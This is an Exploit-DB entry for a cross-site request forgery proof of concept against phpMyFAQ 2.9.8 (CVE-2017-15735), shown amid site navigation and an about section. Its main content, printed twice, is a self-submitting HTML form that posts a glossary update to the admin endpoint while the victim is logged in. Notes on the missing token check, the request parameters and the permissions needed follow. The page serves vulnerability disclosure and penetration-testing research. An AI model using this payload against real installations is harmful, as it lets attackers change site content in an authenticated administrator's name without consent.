---
title: [webapps] phpMyFAQ  2.9.8 - Cross-Site Request Forgery (CSRF)
url: https://www.exploit-db.com/exploits/52458
source: Exploit-DB.com RSS Feed
date: 2025-12-03
fetch_date: 2025-12-04T03:17:41.948624
---

# [webapps] phpMyFAQ  2.9.8 - Cross-Site Request Forgery (CSRF)

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# phpMyFAQ 2.9.8 - Cross-Site Request Forgery (CSRF)

#### EDB-ID:

###### 52458

#### CVE:

###### [2017-15735](https://nvd.nist.gov/vuln/detail/CVE-2017-15735)

---

**EDB Verified:**

#### Author:

###### [CodeSecLab](/?author=12239)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [PHP](/?platform=php)

#### Date:

###### 2025-12-03

---

**Vulnerable App:**

```
# Exploit Title: phpMyFAQ  2.9.8 Cross-Site Request Forgery (CSRF)
# Date: 2024-10-26
# Exploit Author: CodeSecLab
# Vendor Homepage: https://github.com/thorsten/phpMyFAQ
# Software Link: https://github.com/thorsten/phpMyFAQ
# Version: 2.9.8
# Tested on: Ubuntu Windows
# CVE : CVE-2017-15735

PoC:
While still logged in, open another browser window:
<html>
   <body>
      <form action="http://phpmyfaq/admin/index.php?action=updateglossary" method="POST">
         <input type="hidden" name="id" value="1">
         <input type="hidden" name="item" value="Malicious Glossary Item">
         <input type="hidden" name="definition" value="This is a malicious definition.">
         <input type="submit" value="Submit request">
      </form>
      <script>
         document.forms[0].submit();
      </script>
   </body>
</html>

Some Details:
{
    "Protection Mechanisms Before Patch": "There was no CSRF token validation in place for the glossary modification actions (add, update, delete). The patch introduced CSRF token checks for both POST and GET requests to ensure that only authorized sessions could perform these actions.",
    "File Navigation Chain": "Public Access Entry URL -> phpmyfaq/admin/index.php -> glossary.main.php -> glossary.edit.php",
    "Execution Path Constraints": "The user must be authenticated with the necessary permissions ('editglossary') to reach and interact with the glossary functionality through the 'index.php' entry point. Without proper authentication, the server redirects to the login form.",
    "Request Parameters": "id, item, definition",
    "Request Method": "POST",
    "Request URL": "http://phpmyfaq/admin/index.php?action=updateglossary",
    "Final PoC": "```\n<html>\n   <body>\n      <form action=\"http://phpmyfaq/admin/index.php?action=updateglossary\" method=\"POST\">\n         <input type=\"hidden\" name=\"id\" value=\"1\">\n         <input type=\"hidden\" name=\"item\" value=\"Malicious Glossary Item\">\n         <input type=\"hidden\" name=\"definition\" value=\"This is a malicious definition.\">\n         <input type=\"submit\" value=\"Submit request\">\n      </form>\n      <script>document.forms[0].submit();</script>\n   </body>\n</html>\n```"
}

[Replace Your Domain Name]
```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| --- | --- | --- | --- |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) |

Databases

[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links

[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites

[OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com/)

Solutions

[Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or...